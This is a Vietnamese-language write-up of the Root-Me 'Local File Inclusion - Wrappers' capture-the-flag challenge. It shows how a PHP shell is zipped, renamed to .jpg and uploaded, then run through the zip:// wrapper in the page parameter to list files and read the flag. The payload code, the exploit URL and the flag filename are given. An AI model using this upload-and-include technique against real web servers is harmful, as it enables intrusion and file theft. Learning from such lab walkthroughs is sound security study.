<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-fi/fi_chall4" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    Local File Inclusion - Wrappers
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
              </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Wrappers" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Wrappers</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Abbreviated LFI</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Retrieve the flag.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <p>Thử upload 1 file hình jpg lên,ta thấy URL là:</p>
                <blockquote>
                    <p><a href="http://challenge01.root-me.org/web-serveur/ch43/index.php?page=view&amp;id=tvWkXHjAH" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch43/index.php?page=view&amp;id=tvWkXHjAH</a></p>
                </blockquote>
                <p>Thử upload shell.php upload thành shell.jpg sau đó upload lên thì thành công. Nó nằm ở:</p>
                <blockquote>
                    <p>tmp/upload/tvWkXHjAH.jpg</p>
                </blockquote>
                <p>Nhưng mà khi thử:</p>
                <blockquote>
                    <p><a href="http://challenge01.root-me.org/web-serveur/ch43/?page=tmp/upload/tvWkXHjAH.jpg" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch43/?page=tmp/upload/tvWkXHjAH.jpg</a></p>
                </blockquote>
                <p>Thì báo lỗi:<br>Warning: include(tmp/upload/tvWkXHjAH.jpg.php): failed to open stream: No such file or directory in /challenge/web-serveur/ch43/index.php on line 40</p>
                <p>Thì ra nó có cộng string ‘.php’ vào cuối tên file của ta, mà lại không upload được file có đuôi php nên cách này vô phương.</p>
                <h2 id="Wrapper"><a href="#Wrapper" class="headerlink" title="Wrapper"></a>Wrapper</h2>
                <p>File jpg thật ra là file nén của png. Do đó, ta cũng có thể coi nó như một file zip để đối đãi nha.</p>
                <p>Đến đây,bạn đã biết nên dùng wrapper zip:// rồi chứ gì?<br>Ta tạo 1 con shell.jpg xong nén lại thành .zip sau đó rồi đổi tên thành .jpg rồi upload lên server nào.</p>
                <p>Do bị limit không có những hàm thực thi như exec, system. Nên ta dùng shell:</p>
                <pre><code class="php"><span class="meta">&lt;?php</span>
print_r(scandir(<span class="string">'.'</span>));
<span class="meta">?&gt;</span>
</code></pre>
                <p>Bị dính lỗi: <strong>page name too long</strong></p>
                <p>Đổi tên từ shell.php thành b.php rồi nén lại.<br>Payload:</p>
                <blockquote>
                    <p><a href="http://challenge01.root-me.org/web-serveur/ch43/index.php?page=zip://tmp/upload/r3qLVe3z1.jpg%23b" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch43/index.php?page=zip://tmp/upload/r3qLVe3z1.jpg%23b</a></p>
                </blockquote>
                <p>Ta thấy:  flag-mipkBswUppqwXlq9ZydO.php<br>Viết lại còn shell dùng file_get_contents file này sẽ ra flag nhé.</p>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>